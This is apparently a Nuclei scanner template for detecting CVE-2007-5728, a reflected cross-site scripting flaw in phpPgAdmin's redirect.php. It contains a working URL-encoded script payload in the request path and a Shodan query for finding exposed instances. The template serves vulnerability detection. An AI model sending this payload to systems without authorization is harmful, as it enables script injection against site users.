id: CVE-2007-5728
info:
  author: dhiyaneshDK
  classification:
    cve-id: CVE-2007-5728
  description: Cross-site scripting (XSS) vulnerability in phpPgAdmin 3.5 to 4.1.1,
    and possibly 4.1.2, allows remote attackers to inject arbitrary web script or
    HTML via certain input available in PHP_SELF in (1) redirect.php, possibly related
    to (2) login.php, different vectors than CVE-2007-2865.
  metadata:
    shodan-query: http.title:"phpPgAdmin"
  name: phpPgAdmin 4.1.1 - 'Redirect.php' Cross-Site Scripting
  reference:
  - https://www.exploit-db.com/exploits/30090
  - http://lists.grok.org.uk/pipermail/full-disclosure/2007-May/063617.html
  - http://www.securityfocus.com/bid/24182
  - http://secunia.com/advisories/25446
  severity: medium
  tags: cve,cve2007,xss,pgadmin,phppgadmin
requests:
- matchers:
  - type: word
    words:
    - <script>alert("document.domain")</script>
  - status:
    - 200
    type: status
  - part: header
    type: word
    words:
    - text/html
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/redirect.php/%22%3E%3Cscript%3Ealert(%22document.domain%22)%3C/script%3E?subject=server&server=test'
